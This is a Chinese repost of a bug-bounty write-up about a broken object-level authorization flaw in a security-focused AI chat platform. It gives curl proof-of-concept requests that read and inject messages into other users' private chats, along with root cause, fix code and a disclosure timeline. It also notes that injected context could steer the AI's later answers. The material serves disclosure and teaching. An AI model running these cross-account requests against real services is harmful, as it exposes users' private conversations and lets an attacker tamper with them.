---
title: 一个 BOLA 漏洞
url: https://mp.weixin.qq.com/s/ECvtZO1iY2Xj7zDLilHsoA
source: Doonsec's feed
date: 2026-09-01
fetch_date: 2026-09-02T06:37:36.644644
---

# 一个 BOLA 漏洞

# 一个 BOLA 漏洞

divakarvasani
divakarvasani

漏洞集萃

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> **本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途；如有侵权烦请告知，我们会立即删除并致歉，谢谢**

在测试一个私有漏洞赏金计划时，我遇到了一个

```
作者: divakarvasani3938
原文链接: https://medium.com/@divakarvasani3938/i-found-a-critical-bola-vulnerability-in-a-cybersecurity-ai-platform-heres-exactly-how-ba84332bbb9d
```

我在一个专注于网络安全的 AI 聊天平台中发现了一个**对象级授权（BOLA）**漏洞。任何经过身份验证的用户——包括免费账户——都可以：

1. **查看**

   任何其他用户的完整私聊记录
2. 在其他用户的聊天对话中**发送**消息

你只需要一个有效的会话和目标用户的简短聊天 ID 即可。无需提升权限，无需特殊工具，只需一条 `curl`条命令。

这为我**赢得了 500 美元的赏金**（高严重性，CVSS 8.6）。下面我将向大家详细介绍我是如何发现这个漏洞的——以及你们如何在下一个目标上应用同样的方法。

## 目标

该平台是一款**专注于网络安全的人工智能聊天产品，**基于以下技术构建：

* **Next.js**

  与 React 服务器组件 (RSC)
* **Auth.js v5**

  支持 JWE 加密会话令牌的
* **Vercel**

  托管
* 用于存储对话的**简短字母数字聊天 ID**（7 个字符，nanoid 风格）

该平台设有免费和付费两种服务等级，支持 GitHub 和 Google OAuth 登录，并定位为面向安全专业人员的“红队”人工智能工具。正是这一细节使得此次 BOLA 事件尤为严重——用户很可能在讨论漏洞利用代码、客户项目、漏洞研究以及内部网络细节。

## 第一阶段：侦察——了解应用

在发送任何测试请求之前，我花了一些时间梳理了该应用程序的结构。

## JS 打包挖掘

我下载了该应用程序加载的每一个 JavaScript 代码块，并在本地进行了分析。现代单页应用（SPA）的打包文件竟然包含如此多的冗余内容。通过对下载的文件进行 grep 搜索，我发现：

* 所有通过 `_buildManifest.js`
* API 端点模式包括 `/api/chats`, `/api/messages`、以及会话路由
* 用于聊天标识符的简短字母数字标识符模式
* Next.js 服务器操作 ID（长十六进制字符串）

**关键观察：**聊天 ID 较短（7 个字符，包含大小写字母和数字）。这对 BOLA 来说是一个危险信号——ID 空间小意味着暴力破解的可行性高，而较短的 ID 通常表明未实施二次所有权验证。

## 会话令牌检查

Auth.js v5 使用 **JWE 加密的会话令牌**——客户端无法对其进行解码。这意味着用户身份信息存储在服务器端的会话中，而服务器全权负责将其与会话数据访问权限进行关联。如果服务器跳过了这一验证步骤，那么客户端方面任何措施都无法挽救局面。

## 观察

我注意到该应用使用了 **React 服务器组件（React Server Components）**——这意味着带有 `RSC: 1`请求头，会导致服务器返回完整的初始化数据，包括嵌入在 RSC 有效载荷中的所有聊天消息。这对读取型漏洞利用来说将至关重要。

## 第二阶段：双账户 BOLA 测试

这里的方法很简单且可重复：

1. 创建两个独立的测试账户（账户 A = 受害者，账户 B = 攻击者）
2. 以账户 A 的身份执行操作
3. 尝试以账户 B 的身份访问或修改该资源
4. 如果有效 → 确认存在 BOLA

## 测试环境配置

账户 A（受害者） 账户 B（攻击者） 身份验证 OAuth OAuth 用户 ID `uid_victim_001``uid_attacker_002`聊天 ID `aB3xK9m``zR7wL2p`

我通过调用会话端点，确认了这两个会话分别属于不同的用户：

```
# Verify Account A identity
curl -sk 'https://example.com/api/auth/session' \
  -H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_A_TOKEN>'
```

**回复：**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jow1el0IZibybm53icUaCKNwiaVJh6py8ibBlbbrwGf8ibWHOO2wiaKaGGQDxsvbFsOZK6wCmY68pZ1HKwDZyziaM868iahibR1jkIQheXhjicchVd980/640?wx_fmt=png&from=appmsg)

**回复：**

```
{
  "user": {
    "name": "TestUser_B",
    "email": "testuser_b@example.com",
    "id": "uid_attacker_002"
  },
  "expires": "2026-07-05T06:36:15.799Z"
}
```

两个不同的用户。两个不同的会话。现在来测试一下。

## 步骤 1 — 账户 A 创建一个私聊

账号 A 发送了一条消息，从而创建了一个聊天 `aB3xK9m`:

```
curl -sk 'https://example.com/api/chat' -X POST \
  -H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_A_TOKEN>' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '{
    "messages": [
      {
        "id": "aB3xK9m",
        "content": "Explain how SQL injection works",
        "role": "user"
      }
    ],
    "id": "aB3xK9m"
  }'
```

AI 给出了详细的解释。此次聊天记录现已存储在数据库中，**归账户 A**（uid\_victim\_001） 所有 。该记录应仅限账户 A 读取和写入。

## 第 2 步 — 阅读 BOLA：账户 B 阅读账户 A 的私聊内容

账户 B 请求账户 A 的聊天页面——**使用账户 B 的会话 Cookie**和账户 A 的聊天 ID：

```
curl -sk 'https://example.com/chats/aB3xK9m' \
  -H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_B_TOKEN>' \
  -H 'RSC: 1' \
  | grep -oP '"content":"[^"]*"' | head -10
```

**预期：**`403 Forbidden`或 `404 Not Found`

**当前回复：**

```
"content":"You are [Platform Name], a cybersecurity focused AI assistant..."
"content":"Explain how SQL injection works"
"content":"SQL injection is a code injection technique that attackers use to..."
```

> *🚨****账号 B 刚刚阅读了账号 A 的完整私聊内容——包括系统提示、用户消息和 AI 回复。***

这里的 `RSC: 1`此处关键在于该标头。当存在此标头时，React 服务器组件会提供完整的页面加载数据（包括所有嵌入的聊天消息）。如果缺少该标头，您将只获得一个不完整的 HTML 框架；而包含该标头时，您将获得完整的内容。

## 第 3 步 — 阅读 BOLA（反向）：账户 A 阅读账户 B 的聊天记录

该漏洞是双向的。账号 A 可以读取账号 B 的聊天记录 `zR7wL2p`:

```
curl -sk 'https://example.com/chats/zR7wL2p' \
  -H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_A_TOKEN>' \
  -H 'RSC: 1' \
  | grep -oP '"content":"[^"]*"' | head -10
```

**当前回复：**

```
"content":"You are [Platform Name], a cybersecurity focused AI assistant..."
"content":"How do I enumerate Active Directory?"
"content":"Active Directory enumeration typically begins with..."
```

> *🚨****已确认是双向的。任何用户都可以阅读其他用户的聊天记录。***

## 第 4 步 — WRITE BOLA：账户 B 向账户 A 的聊天窗口发送一条消息

现在更可怕的部分来了。账户 B 发送了一个 POST 请求至 `/api/chat`，请求体中使用了**账户 B 的会话信息**，但却使用了**账户 A 的聊天 ID**：

```
curl -sk 'https://example.com/api/chat' -X POST \
  -H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_B_TOKEN>' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '{
    "messages": [
      {
        "id": "aB3xK9m",
        "content": "BOLA-WRITE-TEST-FROM-ATTACKER",
        "role": "user"
      }
    ],
    "id": "aB3xK9m"
  }'
```

**预期：**`403 Forbidden`

**当前回复：**

```
HTTP/2 200
content-type: text/plain; charset=utf-8
BOLA-WRITE-TEST-FROM-ATTACKER
[AI response to injected message...]
```

> *🚨****HTTP 200。服务器已处理该消息，并将其保存到账号 A 的对话中。账号 B 刚刚在账号 A 的私聊中发送了一条消息。***

## 第 5 步 — 验证是否已阻止未经身份验证的访问

```
curl -sk 'https://example.com/chats/aB3xK9m' \
  -H 'RSC: 1'
```

**响应：**空 — 未返回任何聊天数据。

这证实了该服务器**确实**具有身份验证功能。您必须先登录。但该服务器**没有授权机制**——它不会验证登录用户是否拥有其所请求的资源的所有权。

## 结果摘要

测试 预期 实际 结果

账号 B 读取账号 A 的聊天记录 403 / 404 200 + 完整聊天内容 🔴 存在漏洞

账号 A 读取账号 B 的聊天记录 403 / 404 200 + 完整聊天内容 🔴 存在漏洞

账户 B 向账户 A 的聊天记录写入消息 403 200 + 消息已保存 🔴 存在漏洞

未经身份验证即可读取任何聊天记录 被阻止 被阻止（空） ✅ 安全

## CVSS 评分细则

**CVSS 4.0 评分：8.6（高）**

`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`

## 为何情况如此严重（背景很重要）

在普通的聊天应用中，一个泄露“某人向聊天机器人说了什么”的 BOLA 可能被视为“中等”严重程度。但在本案例中，由于具体情境的影响，其严重程度被提升至“高”。

这是一个**网络安全人工智能平台**。用户很可能在讨论：

* 他们生成的漏洞利用代码和有效载荷
* 来自正在进行的客户项目的漏洞详情
* 内部网络架构和 IP 地址范围
* 已粘贴凭据和 API 密钥以供分析
* 机密级红队评估结果

在该特定平台上完整读取任何用户的聊天记录，对攻击者而言是一座潜在的“金矿”——而对于那些一直认为自己的工作内容是私密的安保专业人员来说，这则是一次严重的信任危机。

这种**写入能力**进一步加剧了风险。通过向受害者的对话中植入上下文，攻击者可以操纵 AI 未来的响应——从而导致受害者下次与该聊天机器人互动时，AI 会提供错误、误导性或危险的指导。

## 根本原因

服务器执行了**身份验证**（通过会话令牌验证用户是否已登录），但未执行**授权**（验证已登录用户是否拥有其正在访问的聊天室的所有权）。

实际上，这意味着用于 RSC 聊天内容获取和 `/api/chat`POST 请求的数据库查询都缺少所有者子句。原有代码的伪代码如下：

```
-- What the server was doing (VULNERABLE)
SELECT * FROM chats WHERE chat_id = :chat_id
-- What it should have been doing (SECURE)
SELECT * FROM chats WHERE chat_id = :chat_id AND user_id = :session_user_id
```

该错误同时存在于读取路径（React 服务器组件）和写入路径（API 路由处理程序）中。

## 《The Fix》

解决方法很简单：

**1. 在每次访问聊天时添加所有权验证：**

```
// Before returning or writing any chat data, verify ownership
const chat = await db.chats.findFirst({
  where: {
    id: chatId,
    userId: session.user.id  // ← this line was missing
  }
});
if (!chat) {
  return new Response(null, { status: 404 }); // 404, not 403 (don't confirm existence)
}
```

**2. 适用于所有聊天操作**——读取、写入、删除、分享以及任何服务器操作（例如， `clearChats`, `shareChat`).

**3. 考虑使用更长的聊天 ID**（例如 UUIDv4）作为多层次防御措施，以降低暴力破解的可行性。

**4. 审核其他类型的资源**——如果聊天访问权限未被限定范围，则用户资料、计费数据和共享资源可能也未被限定范围。

## 信息披露时间表

日期 事件 第 0 天 发现漏洞并通过 PoC 验证 第 0 天 通过官方漏洞披露计划（VDP）提交报告 第 0 天 + 数小时 团队确认该漏洞 第 1 天 写入路径已修复 第 2 天 针对读取路径提交后续报告（初始修复后该问题仍未解决） 进行中 已支付 500 美元赏金；读取路径修复工作正在进行中

## 漏洞猎手需掌握的关键要点

## 1. 测试时请务必使用两个账户

BOLA 是最高报酬的漏洞类别之一，却也是最容易被忽视的类别之一。你需要两个账号，并对每种资源类型进行系统性的跨账户访问测试。这完全不需要任何成本——既不需要特殊工具，也不需要昂贵的订阅服务。

## 2. 学习 RSC：1 个头部

在使用 React 服务器组件的 Next.js 应用程序中， `RSC: 1`请求头会触发完整的服务器端数据加载响应。如果没有该请求头，您可能会收到一个隐藏数据的局部 HTML 框架；而有了它，您将获得页面加载的所有内容——包括嵌入的资源内容。

## 3. 短 ID 是一种提示

七位字母数字 ID（nanoid 风格）是一个值得注意的信号。较小的 ID 空间表明开发者可能未预见到直接访问的尝试——这通常与缺少所有权验证有关。

## 4. 身份验证 ≠ 授权

一个能正确拒绝未经身份验证请求的服务器，其授权功能仍可能存在问题。请确认这两者是独立存在的。在此案例中：身份验证正常，但授权功能完全缺失。

## 5. 了解架构，而不仅仅是端点

了解这款应用使用 RSC 进行数据加载，并为资源采用短 ID，让我在测试任何一个端点之前就明确了*该从何处着手*。了解架构能成倍提高你的效率。

## 结语

授权漏洞往往是生产环境中影响最为深远的漏洞之一，却鲜为人知。其中既没有 shell 权限，也没有远程代码执行（RCE），更没有惊心动魄的利用链——仅仅是一个缺失的 `WHERE userId = :sessionUserId`子句。但其后果却十分严重：每位用户的私有数据都会暴露给其他所有用户。

在实际项目中测试的、大量使用 API 的应用程序中，这种模式——即“仅验证身份而未授权”——在相当一部分应用中都存在。开发人员在登录系统、OAuth 流程和会话管理上投入了大量精力，却忽略了第二个问题：*该经过身份验证的用户是否真的被允许访问此特定资源？*

如果你是漏洞赏金猎手的新手，那么在测试任何新目标时，BOLA 测试都应是你要尝试的首要方法之一。创建两个账户，找到一个资源，然后尝试从另一个会话中访问它。就是这么简单——而且这种方法总能带来回报。

觉得本文内容对您有启发或帮助？
点个**关注➕**，获取更多深度分析与前沿资讯！

👉 往期精选

[逻辑漏洞：邮箱注册 tips #11](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485053&idx=1&sn=518c8e66c4b2fdf4eb7a0c57c8a28005&scene=21#wechat_redirect)

[非常用403绕过 T...